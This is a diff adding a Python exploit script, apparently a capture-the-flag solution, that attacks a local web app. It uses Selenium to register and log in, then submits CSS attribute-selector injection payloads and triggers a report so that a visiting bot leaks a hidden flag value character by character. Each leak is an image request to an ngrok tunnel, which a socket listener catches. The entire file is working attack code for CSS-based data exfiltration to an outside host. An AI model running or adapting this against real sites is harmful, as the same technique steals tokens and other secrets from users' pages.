@@ -1,0 +1,154 @@
+```
+# pylint: disable=unused-variable
+import socket
+from pyngrok import ngrok
+import threading
+import requests
+import pytest
+from selenium import webdriver
+import sys
+import string
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.keys import Keys
+from time import sleep
+from urllib.parse import unquote
+
+TARGET_URL='http://localhost:8080'
+HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
+PORT = 65432        # Port to listen on (non-privileged ports are > 1023)
+USER= "test1"
+PASS= "test1"
+CURSOR_UP_ONE = '\033[F' 
+ERASE_LINE = '\033[K'
+
+def escape(text):
+    escaped_text=""
+    for i in text:
+        if( i=="{" or i=="}"):
+            escaped_text=escaped_text+"\\"+i
+        else:
+            escaped_text=escaped_text+i
+    return escaped_text
+class SocketThread(threading.Thread):
+    def __init__(self,threadID,name):
+        threading.Thread.__init__(self)
+        self.threadID=threadID
+        self.name=name
+        self.done=""
+        self.ch=""
+    def run(self):
+        self.ch=connect()
+        self.done="done"
+
+class CssThread(threading.Thread):
+    def __init__(self,threadID,name,args):
+        threading.Thread.__init__(self,target=show,args = args)
+        self.threadID=threadID
+        self.name=name
+
+def tunnel():
+    http_tunnel = ngrok.connect(PORT,"http")
+    return http_tunnel.public_url
+
+def close_tunnel(http_tunnel_url):
+    ngrok.disconnect(http_tunnel_url)
+
+def connect():
+    # Open a HTTP tunnel on the default port 80
+    # <NgrokTunnel: "http://<public_sub>.ngrok.io" -> "http://localhost:80">
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.bind((HOST, PORT))
+            s.listen()
+            s.settimeout(20)
+            conn, addr = s.accept()
+            with conn:
+                #print('Connected by', addr)
+                conn.recv(5)
+                sep = ' '
+                data = conn.recv(4).decode("utf-8")
+                data = data.split(sep, 1)[0]
+                data = escape(unquote(data))
+                conn.sendall(b'done')
+                conn.close()
+                return data
+        except:
+            return ""
+
+def show(stop,tun,chrs):
+    #payload="<style>.flag{{display: block !important;}} .flag input[value^='{}']{{background: url("+tun+"/{});}}</style>"
+    payload="<style>.flag{{display: block !important;}} {}</style>"
+    payload_ch=".flag input[value^='{}']{{background: url("+tun+"/{});}}"
+    chrome_driver = webdriver.Chrome()
+    
+    chrome_driver.get(TARGET_URL+'/login')
+ 
+    username = chrome_driver.find_element_by_id("username")
+    username.send_keys(USER)
+    password = chrome_driver.find_element_by_id("password")
+    password.send_keys(PASS)
+    chrome_driver.find_element_by_id("submit").click()
+
+    charset=string.ascii_letters+string.digits+"{"+"}"+"_"
+    exploit=""
+    for i in charset:
+        sys.stdout.write("Adding {}".format(chrs+i)+"\r")
+        sys.stdout.flush()
+        sys.stdout.write(ERASE_LINE)
+        exploit=exploit+payload_ch.format(chrs+escape(i),i)
+    
+    flag=chrome_driver.find_element_by_id("flag")
+    flag.send_keys(payload.format(exploit))
+    chrome_driver.find_element_by_id("submit").click()
+    chrome_driver.find_element_by_id("report").click()
+    #if stop():
+    #    break
+
+def start():
+    tun=tunnel()
+    print(tun)
+    flag="flag"
+    register()
+    threads=[None]*2
+    while(len(flag) == 0 or flag[-1]!='}'):
+        threads[0]=SocketThread(1,"SocketThread")
+        threads[1]=CssThread(2,"CssThread",(lambda : stop_threads,tun,flag))
+        threads[0].start()
+        stop_threads = False
+        threads[1].start()
+        while threads[0].done!='done':
+            pass
+        stop_threads = True
+        threads[0].join()
+        flag=flag+threads[0].ch
+        sys.stdout.write(ERASE_LINE)
+        sys.stdout.write(flag+"\n")
+        sys.stdout.flush()
+
+def login():
+    chrome_driver = webdriver.Chrome()
+    
+    chrome_driver.get(TARGET_URL+'/login')
+ 
+    username = chrome_driver.find_element_by_id("username")
+    username.send_keys(USER)
+    password = chrome_driver.find_element_by_id("password")
+    password.send_keys(PASS)
+    chrome_driver.find_element_by_id("submit").click()
+    return chrome_driver
+
+def register():
+    chrome_driver = webdriver.Chrome()
+    
+    chrome_driver.get(TARGET_URL+'/register')
+ 
+    username = chrome_driver.find_element_by_id("username")
+    username.send_keys(USER)
+    password = chrome_driver.find_element_by_id("password")
+    password.send_keys(PASS)
+    chrome_driver.find_element_by_id("submit").click()
+    chrome_driver.close()
+
+start()
+```
